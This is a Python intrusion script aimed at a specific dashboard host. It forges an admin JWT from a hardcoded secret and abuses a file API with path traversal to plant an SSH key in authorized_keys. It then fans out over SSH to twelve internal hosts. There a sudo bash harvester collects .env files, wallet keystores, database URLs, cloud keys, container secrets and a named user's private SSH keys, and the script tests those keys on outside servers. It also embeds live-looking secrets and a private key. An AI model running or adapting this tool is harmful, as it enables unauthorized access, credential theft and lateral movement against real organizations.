#!/usr/bin/env python3
# i29455 Round D: harvest 12 internal root hosts + secret grep + eericxu key extraction + public test
import os, sys, json, base64, hmac, hashlib, subprocess, random, urllib.parse as up, time

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AGENT = "agent-047f1d22"; AUID = "fc7c3730-4219-11f1-ac43-525400595be1"; ACUST = "aro"; AIP = "18.142.48.45"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"; UPATH = UF + "/authorized_keys"
PRIV = base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUkDMN8EmdvUuS35ygDjn8v74reVaHPncVJZ2ERa1rh"

HOSTS = ["172.31.17.162","172.31.19.141","172.31.20.106","172.31.20.166","172.31.21.175","172.31.22.209",
         "172.31.25.220","172.31.25.244","172.31.26.36","172.31.26.221","172.31.30.240","172.31.31.153"]

HARV = r'''#!/bin/bash
exec 2>&1 </dev/null
export LC_ALL=C
H=$(hostname); echo "### $H"
echo "--envf--"; sudo find /opt /etc /home /root /srv -maxdepth 5 -type f \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '*.env.dev' -o -name '*.env.prod' \) 2>/dev/null | grep -v node_modules | head -20
echo "--ks--"; sudo find /etc /opt /home /root -type f \( -iname '*keystore*.json' -o -iname '*wallet*.json' \) 2>/dev/null | grep -v -E 'node_modules|/proc' | head -15
echo "--tg--"; sudo timeout 30 grep -rIlE 'C56f7063fd6d199ccc443dbbf4283be602d46343|FE18Aa1EFa652660F36Ab84F122CD36108f903B6|zoofi|wandfi|wand-index' /opt /etc /home /root 2>/dev/null | grep -v -E 'node_modules|/\.git/|\.cache|/proc' | head -12
echo "--sec--"; sudo timeout 30 grep -rIhoE '0x[0-9a-fA-F]{64}|postgres(ql)?://[^ "]{6,150}|mysql://[^ "]{6,150}|redis://[^ "]{6,150}|(JWT_SECRET|DATABASE_URL|AGENT_WS_TOKEN|RELAY_JWT_SECRET|OPS_TOKEN|ENROLL_TOKEN|DESKTOP_TOKEN)[=:][^ "]{6,120}|(AKID|LTAI|AKIA|ASIA)[A-Za-z0-9]{12,30}' /opt /etc /home /root 2>/dev/null | grep -v -E 'node_modules|BEGIN' | sort -u | head -35
echo "--dk--"; for c in $(sudo docker ps -q 2>/dev/null | head -8); do sudo docker inspect "$c" --format '{{.Name}} {{range .Config.Env}}{{.}};{{end}}' 2>/dev/null | grep -oE '([A-Z_]*(TOKEN|SECRET|KEY|PASSWORD|DSN|URL))=[^;]{4,90}' | head -4; done
echo "--ghaws--"; ls -d /home/*/.config/gh /home/*/.aws /home/*/.gnupg /root/.config/gh /root/.aws 2>/dev/null | head -12
echo "--keys--"; sudo find /home /root -maxdepth 4 -name 'id_*' -type f 2>/dev/null | head -20
echo "--eericxu--"; for f in /home/coder/.ssh/id_ed25519_eericxu /home/lumii/.ssh/id_ed25519_eericxu; do [ -f "$f" ] && echo "EK:$f:$(sudo base64 -w0 $f)"; done
echo "###END $H"
'''

LOCAL_HARV = r'''#!/bin/bash
exec 2>&1 </dev/null
export LC_ALL=C
H=$(hostname); echo "### $H"
echo "--envf--"; find /opt /etc /home /root /srv -maxdepth 5 -type f \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '*.env.dev' \) 2>/dev/null | grep -v node_modules | head -20
echo "--ks--"; find /etc /opt /home /root -type f \( -iname '*keystore*.json' -o -iname '*wallet*.json' \) 2>/dev/null | grep -v node_modules | head -15
echo "--tg--"; timeout 30 grep -rIlE 'C56f7063fd6d199ccc443dbbf4283be602d46343|FE18Aa1EFa652660F36Ab84F122CD36108f903B6|zoofi|wandfi|wand-index' /opt /etc /home /root 2>/dev/null | grep -v -E 'node_modules|/\.git/|\.cache' | head -12
echo "--sec--"; timeout 30 grep -rIhoE '0x[0-9a-fA-F]{64}|postgres(ql)?://[^ "]{6,150}|mysql://[^ "]{6,150}|redis://[^ "]{6,150}|(JWT_SECRET|DATABASE_URL|AGENT_WS_TOKEN|RELAY_JWT_SECRET|OPS_TOKEN|ENROLL_TOKEN|DESKTOP_TOKEN)[=:][^ "]{6,120}|(AKID|LTAI|AKIA|ASIA)[A-Za-z0-9]{12,30}' /opt /etc /home /root 2>/dev/null | grep -v node_modules | sort -u | head -35
echo "--dk--"; for c in $(docker ps -q 2>/dev/null | head -8); do docker inspect "$c" --format '{{.Name}} {{range .Config.Env}}{{.}};{{end}}' 2>/dev/null | grep -oE '([A-Z_]*(TOKEN|SECRET|KEY|PASSWORD|DSN|URL))=[^;]{4,90}' | head -4; done
echo "--ghaws--"; ls -d /home/*/.config/gh /home/*/.aws /home/*/.gnupg /root/.config/gh /root/.aws 2>/dev/null | head -12
echo "--keys--"; find /home /root -maxdepth 4 -name 'id_*' -type f 2>/dev/null | head -20
echo "--eericxu--"; for f in /home/coder/.ssh/id_ed25519_eericxu /home/lumii/.ssh/id_ed25519_eericxu; do [ -f "$f" ] && echo "EK:$f:$(base64 -w0 $f)"; done
echo "###END $H"
'''

SCRIPT = r'''#!/bin/bash
exec 2>&1 </dev/null
export LC_ALL=C
echo "=== START ==="; id; hostname
echo __PRIVB64__ | base64 -d > /tmp/ourk29455; chmod 600 /tmp/ourk29455
KP=/tmp/ourk29455
echo __HARVB64__ | base64 -d > /tmp/hv29455.sh
for ip in __IPLIST__; do
  ( timeout 170 ssh -n -i "$KP" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 coder@$ip "echo __HARVB64__ | base64 -d > /tmp/h.sh; sudo bash /tmp/h.sh" > /tmp/o29455_$ip 2>&1; echo DONE $ip ) &
done
wait
for ip in __IPLIST__; do echo "=== HOST $ip ==="; head -110 /tmp/o29455_$ip 2>/dev/null; done
echo "=== END ==="
'''

WORK = "/tmp/p29455"; os.makedirs(WORK, exist_ok=True)
KP = os.path.join(WORK, "k29455"); open(KP, "wb").write(PRIV); os.chmod(KP, 0o600)

def b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, b64(s)), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40): return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def call(path, method="GET", body=None, tok=None, bearer=None, headers=None, maxlen=8000, timeout=30):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if tok: args += ["-H", "Cookie: session=" + tok]
    if bearer: args += ["-H", "Authorization: Bearer " + bearer]
    for h in (headers or []): args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(args, timeout=timeout)
    i = out.rfind("__CODE__")
    code = out[i+8:].strip()[:3] if i >= 0 else ""
    body = out[:i] if i >= 0 else out
    return {"code": code, "body": body[:maxlen], "len": len(body)}

def files_read(path, tok, maxlen=6000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), tok=tok, maxlen=maxlen)

def upload(tok, path, name, content):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    args = ["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
            "-F", "files=@%s;filename=%s" % (tmp, name),
            "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))]
    rc, out, err = curl(args)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__")
    return {"code": out[i+8:].strip()[:3] if i >= 0 else "", "body": (out[:i] if i >= 0 else out)[:300]}

def ssh_test(keybytes, user, ip, cmd="hostname;id;sudo -n id 2>&1|head -1"):
    kp = "/tmp/tk_%s" % ip.replace(".", "_")
    open(kp, "wb").write(keybytes); os.chmod(kp, 0o600)
    rc, out, err = sh(["ssh", "-i", kp, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                       "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=6", "-n",
                       user + "@" + ip, cmd], timeout=40)
    return {"rc": rc, "out": out[-600:], "err": err[-300:]}

def main():
    tok = forge({"userId": AUID, "email": "brian@x", "customer": ACUST, "role": "admin"})
    cur = files_read(UPATH, tok)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    if PUB not in orig:
        content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + PUB + "\n"
        R("upload", upload(tok, UF, "authorized_keys", content))
    else:
        R("upload", "ALREADY")
    script = SCRIPT.replace("__PRIVB64__", base64.b64encode(PRIV).decode())
    script = script.replace("__HARVB64__", base64.b64encode(HARV.encode()).decode())
    script = script.replace("__IPLIST__", " ".join(HOSTS))
    sshbase = ["ssh", "-i", KP, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
               "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=18", "-n"]
    ekeys = {}
    try:
        rc, out, err = sh(sshbase + ["coder@" + AIP, "echo " + base64.b64encode(script.encode()).decode() + " | base64 -d > /tmp/rd.sh; bash /tmp/rd.sh"], timeout=560)
        R("RD_rc", rc)
        for i in range(0, len(out), 9000):
            R("RD_%02d" % (i // 9000), out[i:i+9000])
        R("RD_err", err[-1200:])
        import re
        for m in re.finditer(r"EK:(\S+):([A-Za-z0-9+/=]{200,})", out):
            p, kb = m.group(1), m.group(2)
            try:
                ekeys[p] = base64.b64decode(kb)
            except Exception: pass
    except Exception as e:
        R("RD_EXC", repr(e)[:300])
    finally:
        if orig.strip() and PUB not in orig:
            R("restore", upload(tok, UF, "authorized_keys", orig))
    R("EKEYS", {k: len(v) for k, v in ekeys.items()})
    if ekeys:
        kb = list(ekeys.values())[0]
        tests = {}
        for u, ip in [("ubuntu", "43.142.238.91"), ("ubuntu", "81.68.254.22"), ("ubuntu", "122.51.1.87"), ("ubuntu", "1.14.34.31"), ("ubuntu", "124.223.170.146")]:
            tests[u + "@" + ip] = ssh_test(kb, u, ip)
        R("EKTEST", tests)

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
